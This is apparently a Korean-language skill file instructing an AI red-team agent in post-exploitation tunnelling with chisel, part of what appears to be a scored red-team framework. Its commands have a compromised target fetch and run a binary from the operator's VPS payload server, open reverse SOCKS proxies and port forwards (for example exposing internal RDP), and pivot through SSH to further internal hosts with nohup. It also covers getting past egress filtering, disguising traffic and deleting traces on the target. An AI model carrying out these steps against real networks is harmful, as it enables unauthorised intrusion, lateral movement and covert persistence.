---
name: chisel-tunnel
description: chisel 터널: HTTP/WebSocket 으로 캡슐화한 다중화 터널이라 외부 통신 제한과 리버스 프록시를 가장 쉽게 통과한다
whenToUse: suo5 를 쓸 수 없을 때(WebShell 진입점이 아님), 대상이 HTTP 만 나갈 수 있을 때, 포트 포워딩이나 안정적인 SOCKS 가 필요할 때
role: internal
enabled: true
---

# chisel(HTTP 터널 / 포트 포워딩)

> **먼저 VPS 설정을 로드한다**: 이 스킬의 모든 `$REDTEAM_VPS_HOST` / `$VPS_USER` 는 로컬 설정에서 오고,
> 최초에는 `bash $DSH_HOME/redteam/setup.sh` 가 `$DSH_HOME/.env` 에 기록한다. 명령마다 앞에서 한 번 source 한다:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 설정한 적이 없으면 `setup.sh` 를 한 번 실행한다(스킬 `redteam-setup`). SSH 연결성과 페이로드 서비스도 함께 검증된다.

`chisel` 은 TCP 트래픽을 **HTTP/WebSocket** 으로 감싼다. 그래서 **80/443 만 허용하는 외부 통신 정책과 리버스 프록시를 가장 쉽게 통과한다**.
suo5 와의 역할 분담:

| | suo5 | chisel |
| --- | --- | --- |
| 진입 전제 | **WebShell 이 반드시 있어야 한다**(HTTP 채널) | **명령 실행만 되면 된다**(바이너리를 돌릴 수 있으면 충분) |
| 전송 | HTTP 장기 연결(정상 요청으로 위장) | HTTP/WebSocket(upgrade) |
| 강점 | Web 진입점에서 내부망 진입, 사용자가 재사용 가능 | 셸/RCE 진입점에서 내부망 진입, 유연한 포트 포워딩 |
| 노이즈 | 낮음(평범한 Web 요청처럼 보임) | 낮음~중간(WebSocket 특징이 조금 더 뚜렷하다) |

**선택 기준**: WebShell 이 있으면 → `suo5-tunnel` 우선; 명령 실행/RCE 만 있거나 정밀한 포트 포워딩이 필요하면 → chisel.

## 로컬 바이너리

| 파일 | 경로 |
| --- | --- |
| chisel(Linux amd64, 서버와 클라이언트가 같은 바이너리) | `$DSH_HOME/redteam/toolkit/chisel/chisel`(v1.12.0) |

VPS 페이로드 디렉터리에도 동기화되어 있다: `http://$REDTEAM_VPS_HOST:9100/`(대상에서 `curl` 로 바로 받을 수 있다).

## 1. 역방향 SOCKS(가장 많이 쓴다: 대상이 먼저 우리에게 접속)

```bash
# 1) 우리 VPS 에서 서버 기동(tmux 안에서 실행한다. SSH 가 끊기며 죽지 않게)
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  클라이언트의 역방향 터널 등록 허용
#    --socks5   내장 SOCKS5 시작(클라이언트가 붙으면 이 포트를 쓸 수 있다)
#    선택 강화: --auth user:pass   인증을 붙여 스캔당해 무단 사용되는 것을 막는다
#    선택 위장: --backend http://127.0.0.1:80  Web 트래픽을 로컬 사이트로 전달한다

# 2) 대상 측 클라이언트 기동(이미 있는 RCE/명령 실행 지점으로 실행; 바이너리를 먼저 올린다)
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = 역방향 SOCKS; 연결되면 VPS 의 1080 포트가 내부망 SOCKS5 진입점이 된다

# 3) 로컬에서 VPS 의 SOCKS 를 통해 내부망 접근
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf 에 기록: socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ 시스템 /etc/proxychains4.conf 를 고치지 않는다. -f 로 runs/ 아래 임시 설정을 가리킨다
```

## 2. 역방향 포트 포워딩(내부망의 특정 포트를 밖으로 매핑)

```bash
# 대상 측: 내부망 10.0.0.5:3389 를 VPS 의 13389 로 매핑
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# 로컬: VPS:13389 에 바로 연결하면 내부망 3389 이다
rdesktop $REDTEAM_VPS_HOST:13389
```

## 3. 정방향 SOCKS(대상이 우리에게 직접 연결할 수 있고, 우리가 대상 내부망으로 먼저 접속할 때)

```bash
# 대상 측에서 서버 기동
/tmp/c server -p 9443 --socks5
# 우리 측에서 클라이언트로 로컬 포워딩
chisel client <target>:9443 1080:socks
# 이후 proxychains 를 127.0.0.1:1080 으로 향하게 한다
```

## 4. 다단계 / 연동

```bash
# 이미 A 터널(suo5 → 127.0.0.1:1080)이 있고, A 를 통해 내부망 호스트 B 에서 chisel 을 또 띄운다
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# 단계마다 도달 범위를 넓히고, 층마다 터널과 도달 대역을 등록한다
```

## 5. 규율과 자체 보호

1. **반드시 tmux / nohup 안에서 돌린다**: 세션이 끊기면 터널이 사라진다(`nohup ... &` 또는 `tmux`).
2. **서버에 인증을 붙인다**: 공인망 VPS 의 chisel 서버는 포트 스캔을 당한다. `--auth user:pass` 를 붙이고, 사용 후 `pkill` 로 끈다.
3. **포트 선택**: 80/443 을 쓰지 않는다(VPS 의 다른 서비스가 점유했을 수 있다). 9443/8443 같은 상위 포트를 쓰고,
   **VPS 보안 그룹에서 허용**해야 한다.
4. **대상 측 흔적과 파일을 정리한다**: `/tmp/c` 는 사용 후 삭제할 수 있다; 눈에 띄는 특징이 있는 경로에 바이너리를 두지 않는다.
5. **자체 VPS 의 프록시를 "돌파"로 위장하지 않는다**: 터널 등록의 `entry_kind` 는 대상 측 끝단을 분명히 적는다(아래 참조).

## 6. 출력과 적재(강제)

1. **터널을 `redteam_tunnel_add` 로 등록**하고 필드를 모두 채운다:
   - `kind`: `chisel`;
   - `listen`: **사용자가 실제로 쓸 수 있는 리스닝 주소**(예: `$REDTEAM_VPS_HOST:1080` 또는 `127.0.0.1:1080`);
   - `entry`: 대상 측 진입점(예: `10.0.0.6 의 /tmp/c 클라이언트 → VPS:9443`);
   - `reach`: **도달 가능 대역**(예: `10.0.0.0/24`, 실측 후에 채운다. 추측하지 않는다);
   - `entry_kind`: 반드시 `target-outbound`(대상이 리버스하거나 대상에서 chisel 클라이언트를 돌린 경우) 또는
     `target-http`(대상 WebShell 경유), `target-agent`(대상의 장악된 프로세스 경유);
     ⛔ 자체 VPS 에서만 프록시를 열었다면 `self-only` 로 적는다 —— **"돌파로 인정되지 않음" 으로 표시된다**;
   - `command`: 전체 명령 원문(서버 + 클라이언트 양쪽 모두).
2. **연결성을 실측한다**: `curl --socks5-hostname <listen> http://<내부망 대상>/` 또는 `proxychains4 -f ... curl ...`,
   통과해야 터널이 성립한다; 그다음 `redteam_session_check` 로 상태를 환류한다.
3. **득점**: 터널이 내부망에 도달하면 → `redteam_score_hit`(`boundary`, evidence 에 "터널 주소|도달 대역|실측 접근한 내부망 대상" 을 쓴다);
   그것으로 다른 호스트로 횡적 이동하면 → `server-host`.
4. **사용자에게 인계**: 바로 붙여넣을 수 있는 설정을 준다 —— `socks5://<listen>`(또는 `ssh -D` / frp 로 사용자 머신에 매핑하는 방법),
   리스닝 주소와 포트를 분명히 쓰고, 이 터널이 표적 경계를 넘었다는 점을 설명한다.
5. 핵심 동작마다 `redteam_chain_add`(`stage_code=boundary-logical`), `tool` 에 명령 원문, `result` 에 회신 요약.
